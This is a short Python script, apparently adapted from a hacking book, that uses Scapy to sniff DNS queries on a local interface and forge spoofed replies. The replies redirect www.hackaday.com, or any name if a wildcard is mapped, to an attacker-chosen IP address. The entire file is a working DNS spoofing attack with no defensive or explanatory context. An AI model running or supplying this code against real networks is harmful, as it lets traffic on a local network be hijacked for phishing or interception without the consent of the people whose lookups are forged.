# Mostly not mine, from a python hacking book.
import sys
from scapy.all import *

dev = "enp2s0" # Personal interface, yours will be diff
fltr = "udp port 53"
dns_map = {"www.hackaday.com": "192.168.0.13"}

def handle_packet(packet):
	ip = packet.getlayer(IP)
	udp = packet.getlayer(UDP)
	dns = packet.getlayer(DNS)
	
	if dns.qr == 0 and dns.opcode == 0:
		queried_host = dns.qd.qname[:-1]
		resolved_ip = None

		if dns_map.get(queried_host):
			resolved_ip = dns_map.get(queried_host)
		elif dns_map.get('*'):
			resolved_ip = dns_map.get('*')

		if resolved_ip:
			dns_answer = DNSRR(rrname=queried_host + ".",
					    ttl=330, type="A", rclass="IN",
					    rdata=resolved_ip)
			dns_reply = IP(src=ip.dst, dst=ip.src) / \
                        UDP(sport=udp.dport, dport=udp.sport) / \
                        DNS(id = dns.id, qr = 1, aa = 0, rcode = 0,
                            qd = dns.qd, an = dns_answer)

			send(dns_reply, iface=dev)

sniff(iface=dev, filter=fltr, prn=handle_packet)
